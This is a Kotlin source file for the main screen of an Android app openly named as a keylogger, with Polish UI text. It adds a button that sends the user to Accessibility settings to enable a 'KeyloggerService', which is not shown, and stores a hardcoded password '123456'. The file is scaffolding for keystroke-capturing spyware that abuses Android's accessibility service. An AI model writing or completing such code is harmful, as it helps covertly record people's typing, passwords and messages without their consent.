package com.moje.keylogger

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.ComponentActivity

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val btn = Button(this).apply {
            text = if (KeyloggerService.isRunning) "WYŁĄCZ" else "WŁĄCZ KEYLOGGER"
            textSize = 20f
        }
        val status = TextView(this).apply {
            text = if (KeyloggerService.isRunning) "✓ WŁĄCZONY" else "wyłączony"
            textSize = 22f
        }

        btn.setOnClickListener {
            if (KeyloggerService.isRunning) {
                KeyloggerService.isRunning = false
                Toast.makeText(this, "Wyłączono", 0).show()
            } else {
                getSharedPreferences("k", 0).edit().putString("pass", "123456").apply()
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                Toast.makeText(this, "Włącz usługę w ustawieniach!", 1).show()
            }
            finish()
            startActivity(intent) // odświeżenie
        }

        setContentView(LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            addView(btn)
            addView(status)
            setPadding(60, 200, 60, 200)
        })
    }
}